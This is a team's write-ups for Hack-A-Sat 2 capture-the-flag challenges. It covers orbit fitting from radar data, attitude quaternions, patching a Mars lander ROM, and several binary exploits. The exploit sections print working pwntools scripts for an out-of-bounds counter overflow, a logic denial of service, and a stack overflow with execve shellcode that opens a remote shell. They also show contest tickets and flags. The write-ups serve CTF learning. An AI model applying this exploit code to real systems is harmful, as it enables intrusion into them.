# Hack-A-Sat 2 Writeups
Team: *DiceGang*

## Guardians of the...

### Mr. Radar
Given the location of a radar and several radar pulse returns of a satellite, we needed to determine its orbital parameters. We first traced out the path of the satellite using Skyfield. The functions `latlon` and `from_altaz` were particularly helpful to be able to convert the provided data into ICRF coordinates.
```python
from skyfield.api import *
from skyfield.units import *
from skyfield.positionlib import *

ts = load.timescale(builtin=True)

radar = wgs84.latlon(8.7256, 167.715)
radar.elevation = Distance(m=35)

with open('radar_data.txt', 'r') as f:
    dat = f.readlines()[1:]

path = []

xs = []
ys = []
zs = []

for d in dat:
    time, az, el, rng = d.split()
    t2 = time.split(':')
    mins = int(t2[1])
    secs = int(t2[2].split('.')[0])
    stamp = ts.utc(2021, 6, 27, 0, mins, secs)
    rp = radar.at(stamp)
    pos = rp.from_altaz(alt_degrees=float(el), az_degrees=float(az), distance=Distance(km=float(rng)))
    sat = pos.position.km + rp.position.km
    path.append(sat)
    xs.append(sat[0])
    ys.append(sat[1])
    zs.append(sat[2])
```

As a sanity check, we visualized the orbit with `matplotlib`.
```python
from mpl_toolkits import mplot3d
import matplotlib.pyplot as plt
fig = plt.figure()
ax = plt.axes(projection='3d')
ax.set_xlim(4500, 5500)
ax.set_ylim(6700, 7700)
ax.set_zlim(-2000, -3000)
ax.scatter3D(xs, ys, zs)
plt.show()
```

We then used a least squares regression to fit an elliptical orbit to our calculated coordinates, using Skyfield's `Satrec` to quickly trace out an orbit given the orbital parameters. We used this [calculator](http://orbitsimulator.com/formulas/OrbitalElements.html) to estimate initial parameters for the regression, using the first two data points to generate a position-velocity vector to convert into orbital parameters.
```python
def cost(params, debug=False):
    M = 5.9722e24
    G = 6.6743015e-11
    a, e, i, Omega, omega, M0 = params
    P = np.sqrt(4*np.pi**2 / (G*M) * (1000*a)**3) / 60

    satrec = Satrec()
    satrec.sgp4init(
        WGS72,
        'i',
        1337,
        t0.tdb - 2433281.5,
        0.0, # drag
        0.0,
        0.0,
        e,
        np.radians(omega),
        np.radians(i),
        np.radians(M0),
        2*np.pi / P,
        np.radians(Omega),
    )
    sat = EarthSatellite.from_satrec(satrec, ts)
    if debug:
        return sat

    err = []
    for i in range(100):
        t = ts.utc(2021, 6, 27, 0, 8, 12+i)
        err += list(path[i] - sat.at(t).position.km)

    return err

#initial parameters
a = 20804.737560848476
e = 0.6610543599443122
i = 33.99839311086964
Omega = 78.00087926523055
omega = 271.65368202323253
M0 = 10.704246168858505
sol = least_squares(cost, np.array([a, e, i, Omega, omega, M0]))
print(sol)

params = [2.29939092e+04, 7.00821959e-01, 3.38773730e+01, 7.82120294e+01, 2.70127740e+02, 9.77239867e+00] # from solution
print(cost(params))
sat = cost(params, debug=True)
t = ts.utc(2021, 6, 27, 0, 9, 52)

print(sat.at(t).position.km)
print(sat.at(t).velocity.km_per_s)
```
The regression gave the orbital parameters that best fit our data, and submitting those to the server gives us the flag.

## Deck 36, Main Engineering

### Quaternion

When we connect to the service, we are given the following message:

```
A spacecraft is considered "pointing" in the direction of its z-axis or [0,0,1] vector in the "satellite body frame."
In the J2000 frame, the same spacecraft is pointing at [ 0.14129425 -0.98905974  0.04238827].
Determine the spacecraft attitude quaternion.
```

Quaternions are generally used for performing rotations, and what we want is to find the quaternion which causes a rotation from `(0, 0, 1)` to `(0.14129425, -0.98905974, 0.04238827)`.

Initially, I attempted to just find code online which would take two vectors and compute the quaternion, but couldn't find any good results. However, what we can do instead is search for code online which takes two vectors and computes the _rotation matrix_, and from there, utilize some library to convert it to a quaternion.

Specifically, I found [this](https://math.stackexchange.com/questions/180418/calculate-rotation-matrix-to-align-vector-a-to-vector-b-in-3d), which had MATLAB code to calculate the rotation matrix. I plugged in the values we had, then used [this library](https://www.mathworks.com/help/robotics/ref/rotm2quat.html) to convert the rotation matrix to a quaternion, which gives us the answer.

```
GG = @(A,B) [ dot(A,B) -norm(cross(A,B)) 0;              norm(cross(A,B)) dot(A,B)  0;              0              0           1];

FFi = @(A,B) [ A (B-dot(A,B)*A)/norm(B-dot(A,B)*A) cross(B,A) ];

UU = @(Fi,G) Fi*G*inv(Fi);
a=[0 0 1]'; b=[0.14129425 -0.98905974  0.04238827]';

U = UU(FFi(a,b), GG(a,b));

quat = rotm2quat(U)
```

This gives us the values `(0.6850, 0.0979, 0, 0.7219)` in the format `(x, y, z, w)`, which, when given to the server, results in the flag.

`flag{whiskey83410sierra2:GNEax-JdwbnsoPRymnJjdK_Iv1Lx5Q9nh40PcpNTh8wEY-kYOAiST4E5JZP93V7bEKyZMK1DriiEe-Y9jLkPUOA}`

### Take Out the Trash

We are given two TLE files to show the paths of the satellites and the asteroids they need to shoot. The skyfield API can process these very easily, so there's no real point in looking into the format too much. I initially plotted all of the paths on a 3d graph, and saw all objects had relatively simiar paths. At this point, I started scripting min distance between all satellites for all asteroids to see when they will be too close and make us lose. This was all fairly simple to do, but then came calculating the quaternions. I didn't particularly understand the concept, but in the end one of my teammates found a simple and easy way to leverage the scipy library with the TLEs to calculate the quaternion between a satellite and asteroid at a specific time. 

After sucessfully calculating quaternions, we ran into a problem that wasn't stated in the description, the lasers needed to cool down. We weren't really sure how the laser cooldown system worked, but we eventually just attempted a minmute between shots per satellite and it seemed to work fine. The full solve script is written below:

```python
#calculate quaternion
	def get_rot(dst):
			src = np.array([0, 0, 1])
			v = np.cross(src, dst)
			c = np.dot(src, dst)
			V = np.matrix([
					[0, -v[2], v[1]],
					[v[2], 0, -v[0]],
					[-v[1], v[0], 0]])
			R = np.identity(3) + V + 1/(1+c) * V @ V
			return Rotation.from_matrix(R)
	#calculate 3d distance
	def calcDistance(x1,y1,z1,a1,b1,c1):
		return np.sqrt((x-a)**2+(y-b)**2+(z-c)**2)
	
	
	from scipy.spatial.transform import Rotation
	from scipy.spatial import distance
	from skyfield.api import load, EarthSatellite
	from skyfield.functions import mxm
	from skyfield.timelib import Time
	from skyfield.framelib import ecliptic_J2000_frame
	import numpy as np
	import matplotlib.pyplot as plt
	from mpl_toolkits.mplot3d import Axes3D
	
	#initialize satellites and junk
	satellites = load.tle_file('sats.tle')
	junk = load.tle_file('spacejunk.tle')
	
	#initialize objects
	ts   = load.timescale()
	used = dict()
    #checks 2500 minutes from the epoch
	minu = np.arange(0,2500)
	time = ts.utc(2021, 6, 26, 0, minu)
	success = dict()
	for junks in junk:
		success[junks] = 0
	
	final = ""
	
	for junks in junk:
			goal = junks
			Jpos = goal.at(time).position.km
            #increments through the satellites for each piece of junk
			for i in range(len(satellites)):
					if success[junks] == 1:
						break
					Rpos = satellites[i].at(time).position.km
	
					if True:
						x, y, z = Rpos
						a,b,c = Jpos
						distance = calcDistance(x,y,z,a,b,c)
						#check for possible deaths greedily
						for d in distance:
							if d <= 10:
								print("fail" + str(distance))
								print(satellites[i])
								print(junks)
						#check if within range with a 5 km buffer
						for d in distance:
							if success[junks] == 1:
								break
                            #use 95 km for some breathing room
							if d < 95:
								for k in range(len(distance)):
									if d == distance[k]:
										curr_t = ts.utc(2021, 6, 26, 0,k)
                                        #makes a dictionary of all satellites and the times they are used as to not reuse them
										if satellites[i] not in used:
											used[satellites[i]] = list()
											used[satellites[i]].append(k)
										else:
											if k in used[satellites[i]]:
													break
											used[satellites[i]].append(k)
										tim  = k
										hours = int(tim/60)
										minutes = int(tim % 60)
										thing = str(satellites[i]).split(" ")
										frame = (junks - satellites[i]).at(curr_t).position.km
										dst = frame / np.linalg.norm(frame)
										q = get_rot(dst).as_quat()
										#formatting
										final += (("2021177.{:02d}{:02d}00 " + thing[0].upper() +" FIRE "+ str(q[0]) + " "+ str(q[1]) + " "+str(q[2]) + " " + str(q[3]) + " " + str(d) + "\n").format(hours, minutes))
										success[junks] = 1
										break
	
	#sorting the commands by time
	x = final.split("\n")
	x.sort()
	for i in x:
			print(i)
```

We printed this to a file and sent it to the netcat to finally grab the flag: 

flag{mike492688victor2:GPVUr9lOMAf92TgIU_K_0DmcQ01n7Otql9nxrc7MtMooWExuG845Ms5K1QypwXZwTpPhpgTzitbYo9wc3xQIzmY}


## Rapid Unplanned Disassembly

### Tree in the Forest
We are given C source code for a packet communication program. Upon startup, the program spawns a UDP server and listens for connections.

Packet structure is specified in the following struct:
```c
typedef struct command_header{
    short version : 16;
    short type : 16;
    command_id_type id : 32;
} command_header;
```

We notice that in `handle_message`, there is a potential to print the flag:
```c
const char* handle_message(command_header* header){
    command_id_type id = header->id;
    // Based on the current state, do something for each command
    switch(lock_state){
        case UNLOCKED:
            if (id == COMMAND_GETKEYS)
                return std::getenv("FLAG");
            else
                return "Command Success: UNLOCKED";
        default:
            if (id == COMMAND_GETKEYS)
                return "Command Failed: LOCKED";
            else
                return "Command Success: LOCKED";
    }

    // Forward command to antenna
}
```

In order to take the path that returns the flag, `lock_state` must be set to `UNLOCKED` and the `id` of our packet must be `COMMAND_GETKEYS`.

The `lock_state` is declared right before a log buffer:
```c
unsigned int lock_state;
char command_log[COMMAND_LIST_LENGTH];
```

In `main` it is set to `LOCKED` and there are no other references so we suspect there may be a buffer overflow vulnerability here.

We notice that inside `server_loop`, the program tries to log how many times each type of packet has been seen via `command_log[header->id]++;` However, `header->id` is both attacker-controlled and unbounded. Therefore, we can specify a negative index to overwrite bytes of the flag.

Since `command_log` is a `char` array, we only need to increment 255 times before the byte overflows and `lock_state` becomes 0 (i.e. unlocked).

Our solution script is given below.
```python
from pwn import *
import struct

s = remote('lucky-tree.satellitesabove.me', 5008)
s.sendafter('please:', 'ticket{whiskey985814alpha2:GLlywMhvIK3cJe9DCpZoLKyCQm-2G48Uy1qUJSK76StCQgdf8w1LDGFpFOXyNrFehQ}\n')

r = s.recvline()
r = s.recvline()

addr = r.split(b'udp:')[1].strip().decode('ascii')
addr, port = addr.split(':')
print(addr, port)

def cmd(version, type, id):
    return struct.pack('<H', version) + struct.pack('<H', type) + struct.pack('<I', id)

z = remote(addr, int(port), typ='udp')

for x in range(255):
    z.send(cmd(0, 0, 0xfffffff8))
z.send(cmd(0, 0, 0x9))

z.interactive()
```

### Mars or Bust

When we connect to the remote server for this challenge, it spawns a web server and gives us a link. After accessing the webpage, we have the option to upload/download a ROM and run a Mars landing simulation. The default ROM gives the following behavior:

![](https://i.imgur.com/izro1ye.png)

Clearly something is wrong with this landing. If we observe the velocity plot, we can see that the lander cuts the engines too high and plummets into the ground.

The goal of this challenge is two-fold:
1. Reverse engineer the MIPS ROM and understand how the landing procedure works.
2. Patch the ROM for a successful landing. 

The ROM itself doesn't contain any metadata about the base address (like an executable file ELF/MACH-O/EXE... would). The first step is to investigate the instructions and see if we can find references to any fixed addresses. We can make use of the following ROM knowledge:
1. Execution usually starts at offset 0 (i.e. the start of ROM). Typically this is a reset vector.
2. Often times, the ROM will copy R/W data into RAM during startup.

After briefly investigating the ROM, we find references to `0xBFC0 0000` addresses for instructions as well as `0xA018 0000` for data. We can format the ROM properly in binary ninja with the following commands:

```python=
bv.add_auto_segment(0xBFC0000, 0x1000, 0, 0x1000, SegmentFlag.SegmentReadable | SegmentFlag.SegmentExecutable)
bv.add_auto_segment(0xA0180000, 0x1000, 0x5efc, 0x649c - 0x5efc, SegmentFlag.SegmentReadable | SegmentFlag.SegmentWritable)
```

Now that we can load the ROM properly, the next step is to correlate the behavior we see in the simulation with the code.

We identified a large stateful function that seems to operate in several phases, correlating with the different states we see on the simulation:
- open parachute
- drop parachute
- controlled descent 1
- controlled descent 2
- final burn
- cut engine

If we patch the state transition code in any of these parts, we can sucesfully change the behavior in the simulation (i.e. prevent the lander from going to the next phase or skip phases entirely).

At this point, we misunderstood what the original error was (engine cut too early) and spent a lot of time reverse engineering the controlled descent phase. The existing code uses a PID controller to reach a target altitude/velocity. We ended up replacing this entire phase with a suicide burn only to realize that the real issue was with the last phase.

In the `final burn` phase, the lander throttles between 40% and 100% based on the descent velocity. Seperately, there are 3 boolean flags (sensors?) that control when the engine is shut off. If any of these flags is active for two ticks, the engine gets shut off.

During our solution, we suspected these might represent landing leg sensors but we didn't investigate too closely. We simply patched out this code and replaced it with a check if our altitude is zero. This wouldn't work in real life because of imprecision issues but it worked in the simulation.

In essence, we replaced the following check:
```c=
if (leg_a || leg_b || leg_c) shutoff_engine();
```

with:
```c=
if (altitude == 0) shutoff_engine();
```

Afterwards, we realized this problem was modeled after the failed Mars Polar Lander: https://en.wikipedia.org/wiki/Mars_Polar_Lander#Landing_attempt

In this crash, each of the three legs had a Hall Effect sensor that would activate when in contact with the surface. However, it could also activate spuriously while the lander was still above the ground. If this reading lasted at least two ticks, it would trigger the engine shutoff event.

A more realistic solution could be to patch the code to something like:
```c=
if (leg_a && leg_b && leg_c) shutoff_engine();
```

I.e. mitigate the chance of a spurious landing event by requiring all sensors to be active for two ticks.

### amogus
The challenge implements an interface for us to cast votes. After reversing the entire binary, it is unclear what the our votes are used for, but since challenge description mentions "winning the vote", we might as well try to prevent the other two voters from voting regularly. To achieve this, we can exploit a logic bug in the vote receiving thread. A rough sketch of the thread is as follows.
```
1. polls for commands (key + cmd + cmdsize)
2. if cmd is vote, wait for user to send vote
3. repeat from 1
```

Other commands are supported, but since they aren't relevant in the attack, we'll skip it for now.

It is obvious that by starting a vote request and not sending the following vote, the vote receiver thread will he stuck at 2. This successfully prevents any other voters from interacting with it. Thus "wins the vote".

On retrospect, the target on this challenge is unclear, and since there is actually another UAF bug in it(which is much harder to exploit), participants may have followed the wrong lead and tried to pwn it. This somehow explain the low solve count albeit low technical difficulty to achieve logic DoS.
```python
from pwn import *
import binascii
import hashlib

###Util
def parseMsg(log=True):
    res = binascii.unhexlify(r.recvline()[:-1])
    mode = u32(res[:4])
    key = res[4:0x24]
    datalen = u32(res[0x24:0x28])
    data = res[0x28:0x28+datalen]
    if log is True:
        print(mode)
        print('\t',key)
        print('\t',data)
    return mode,key,datalen,data

def sendMsg(cmd,size,data,pause=False):
    global key
    r.sendline(binascii.hexlify(p32(cmd)+key+p32(size)))
    if pause is True:
        r.interactive()
        cnt = 0
        while True:
            mode,_,_,_ = parseMsg()
            if mode==0:
                cnt+=1
                if cnt==10:
                    print('break free')
                    break
        r.interactive()
    if cmd==1:
        r.sendline(binascii.hexlify(data))
        key = hashlib.sha256(key).digest()

def vote(data):
    if type(data)==str:
        data = data.encode()
    data = data.ljust(0x20,b'\x00')
    sendMsg(1,0x20,data)

def withdrawVote():
    sendMsg(5,1,b'x')

def create(data):
    if type(data)==str:
        data = data.encode()
    sendMsg(3,len(data),data)

def bogus_vote(data):
    if type(data)==str:
        data = data.encode()
    data = data.ljust(0x20,b'\x00')
    sendMsg(1,0x20,data,pause=True)

###
ticket = 'ticket{uniform209323echo2:GO1uYhUCBx7CgElKTxojC7ISv-4Qk-fXd0lXJzmGr4HYhUGNJBNNGGuMLLdF-hrY1Q}'

r = remote('subtle-rumor.satellitesabove.me',5024)
r.sendlineafter('please:\n',ticket)
r.recvuntil('key: ')
key = r.recvline()[:-1]

while True:
    mode,_,_,data = parseMsg()
    if mode==0:
        break

vote(b'M30W')
vote(b'M30W')
bogus_vote('M30W')
while True:
    mode,key,_,data = parseMsg()
r.interactive()
```

## Presents from Marco

### King's Ransom pt. 1 & 2

We are provided a binary which implements all kinds of different functionalities. The functions are stored in a 4\*4 function lookup table, and we can select the index of which function to invoke, as well as the payload used as argument.
Before user interaction starts, flag1 and flag2 are read into the binary and stored in memory with one of the functions mentioned above.

At first glance, the target seems to be to recover data from memory, which is quite trivial, since we can craft a fake object with large buffer size in mem, and later get OOB read from object. However, after leaking stuff from the memory, nothing remotely similar to flag exists, and we are forced to dig further.

Challenge description mentioned that some attacker exploited the system, encrypted some files, and resumed the program. This description hinted that before we are allowed to access this system, some other attacker might have already interacted with it first, and potentially wiped out the flag stored in memory. Upon careful inspection of the leaked data from memory, we realize this is in fact artifact left behind from the attack. The leaked shellcode serves as a stager which calls mmap, reads some shellcode and jumps to the mmaped address. So at this point we have confirmed some attacker did wipe out the flag from mem, but have no idea what he actually did.

The next step would obviously be to exploit the program just as attacker did, after some searching, one of my teammates pointed out that a strange float handling function can be exploited for stack overflow. We then quickly crafted some shellcode in memory, utilized the overflow to redirect program to our shellcode, and got shell remotely. The first flag was in plaintext on remote, and that concludes the first part of challenge.

The second flag was also on remote, but is securely encrypted. This means that we either have to crack the encryption(which is obviously impossible), or somehow try to leak more encryption related artifact from process memory(assuming it exists). So I soon set out to writing some memory scanning shellcode. The shellcode worked locally, but due to some unknown payload filtering on remote server, we can't get it to run on properly on target host. 

Luckily, another teammate of mine noticed that flag2 is passed as environment variable to the wrapper program, and retrieved it by looking at stuff under /proc/ directory.

script to get shell is shown below

```python
from pwn import *

context.arch = 'amd64'

def hash_data(data):
    res = 0x1d0f    #word
    data = list(data+b'\x00\x00\x00\x00')
    size = len(data)
    for i in range(size):
        res^=data[i]<<8
        res = res&0xffff
        for j in range(8):
            if res&0x8000==0:
                res*=2
            else:
                res = (res*2)^0xa02b
            res = res&0xffff
    return res

def Cwrapped(y,x,data):
    if type(data)==str:
        data = data.encode()
    Hash = hash_data(data)
    payload = b'\x55\xaa'+p16(len(data)+4)+p16(Hash)+p8(y)+p8(x)
    r.send(payload)
    r.send(data+b'\x00\x00\x00\x00')

def Craw(offset, data):
    if type(data)==str:
        data = data.encode()
    return p16(offset)+p16(len(data)+4)+data

s = remote('wealthy-rock.satellitesabove.me',5010)
s.sendlineafter('please:\n','ticket{lima438314lima2:GKcI7Bfg7Afr5H7GMYaFLcoW8LRUxt-WZzORseMsW3OScGnX-MlKvTzLxVLr4KZ1lQ}')
_,ip,port = s.recvline()[:-1].split(b':')
r = remote(ip,int(port))

sc = asm('''
         mov rdi, 0x12800000
         mov rsi, 0
         mov rdx, 0
         mov rax, 0x3b
         syscall
         ''')
payload = b'/bin/sh\x00'+sc
print(len(payload))

Cwrapped(2,1,Craw(0,payload))

Cwrapped(1,1,Craw(0,b'a'*0x8+p64(0)+p64(0x12800008)))

r.interactive()
```
